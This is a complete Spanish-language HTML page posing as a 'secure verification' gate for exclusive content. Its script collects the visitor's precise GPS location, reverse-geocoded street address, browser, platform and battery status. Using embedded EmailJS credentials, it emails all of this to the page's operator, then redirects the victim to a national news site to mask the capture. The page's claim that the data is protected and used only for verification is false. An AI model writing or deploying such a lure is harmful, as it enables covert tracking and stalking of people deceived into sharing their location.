<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verificación Segura</title>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("Ig0pScVTkAMjIAVCC");
    })();
  </script>
  <style>
    body {
      font-family: 'Montserrat', sans-serif;
      height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #1f1c2c, #928dab);
      background-size: 300% 300%;
      animation: gradient 10s ease infinite;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    @keyframes gradient {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      background: rgba(255, 255, 255, 0.08);
      padding: 40px 30px;
      border-radius: 20px;
      backdrop-filter: blur(15px);
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.4);
      text-align: center;
      max-width: 400px;
      width: 100%;
    }

    h1 {
      font-size: 26px;
      margin-bottom: 15px;
    }

    p {
      font-size: 16px;
      margin-bottom: 25px;
      line-height: 1.5;
    }

    .small {
      font-size: 13px;
      opacity: 0.85;
    }

    button {
      background: #ffffff;
      color: #1f1c2c;
      padding: 14px 30px;
      font-size: 16px;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      font-weight: bold;
      transition: 0.3s ease;
      box-shadow: 0 4px 15px rgba(255, 255, 255, 0.2);
      animation: pulse 1.8s infinite;
      position: relative;
    }

    button:hover {
      background: #f0eaff;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.04); }
      100% { transform: scale(1); }
    }

    .spinner {
      display: none;
      margin-top: 15px;
    }

    .spinner div {
      width: 10px;
      height: 10px;
      background-color: white;
      border-radius: 100%;
      display: inline-block;
      animation: bouncedelay 1.4s infinite ease-in-out both;
    }

    .spinner .bounce1 {
      animation-delay: -0.32s;
    }

    .spinner .bounce2 {
      animation-delay: -0.16s;
    }

    @keyframes bouncedelay {
      0%, 80%, 100% { transform: scale(0); }
      40% { transform: scale(1); }
    }

    #mensajeFinal {
      display: none;
      margin-top: 20px;
      font-size: 15px;
      opacity: 0.9;
      animation: fadeIn 1s ease-in-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Verificación Rápida</h1>
    <p>Para garantizar tu seguridad y desbloquear el contenido exclusivo, necesitamos confirmar tu zona de acceso.</p>
    <p class="small">*Tu información está protegida y solo se usará para verificación de acceso.</p>
    <button onclick="getLocation()" id="btn">Desbloquear Acceso</button>
    <div class="spinner" id="spinner">
      <div class="bounce1"></div>
      <div class="bounce2"></div>
      <div class="bounce3"></div>
    </div>
    <div id="mensajeFinal">Verificando acceso seguro, por favor espera...</div>
  </div>

  <script>
    const datosExtra = {
      fecha: new Date().toLocaleString(),
      navegador: navigator.userAgent,
      sistema: navigator.platform,
      bateria: "Desconocido",
      cargando: "Desconocido"
    };

    if (navigator.getBattery) {
      navigator.getBattery().then(function(battery) {
        datosExtra.bateria = `${Math.round(battery.level * 100)}%`;
        datosExtra.cargando = battery.charging ? "Sí" : "No";
      });
    }

    function getLocation() {
      document.getElementById("btn").style.display = "none";
      document.getElementById("spinner").style.display = "block";

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, showError);
      } else {
        alert("Geolocalización no soportada por tu dispositivo.");
        resetUI();
      }
    }

    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

      fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`)
        .then(response => response.json())
        .then(data => {
          const direccion = data.display_name || "No disponible";
          const countryCode = data.address.country_code?.toUpperCase() || "US";
          const countryName = data.address.country || "Desconocido";

          emailjs.send("service_1h9h8cb", "template_jpz209b", {
            latitud: lat,
            longitud: lon,
            direccion: direccion,
            map_url: mapLink,
            pais: countryName,
            fecha: datosExtra.fecha,
            navegador: datosExtra.navegador,
            sistema: datosExtra.sistema,
            bateria: datosExtra.bateria,
            cargando: datosExtra.cargando
          }).then(function() {
            const noticiasPorPais = {
              "CO": "https://www.eltiempo.com/",
              "MX": "https://www.eluniversal.com.mx/",
              "AR": "https://www.clarin.com/",
              "PE": "https://elcomercio.pe/",
              "CL": "https://www.latercera.com/",
              "EC": "https://www.eluniverso.com/",
              "VE": "https://www.el-nacional.com/",
              "ES": "https://elpais.com/",
              "US": "https://edition.cnn.com/"
            };

            const destino = noticiasPorPais[countryCode] || "https://news.google.com/";
            document.getElementById("spinner").style.display = "none";
            document.getElementById("mensajeFinal").style.display = "block";

            setTimeout(() => {
              window.location.href = destino;
            }, 2500);
          }, function() {
            alert("Error al enviar la información.");
            resetUI();
          });
        });
    }

    function showError() {
      alert("acces 1.");
      resetUI();
    }

    function resetUI() {
      document.getElementById("btn").style.display = "inline-block";
      document.getElementById("spinner").style.display = "none";
      document.getElementById("mensajeFinal").style.display = "none";
    }
  </script>
</body>
</html>
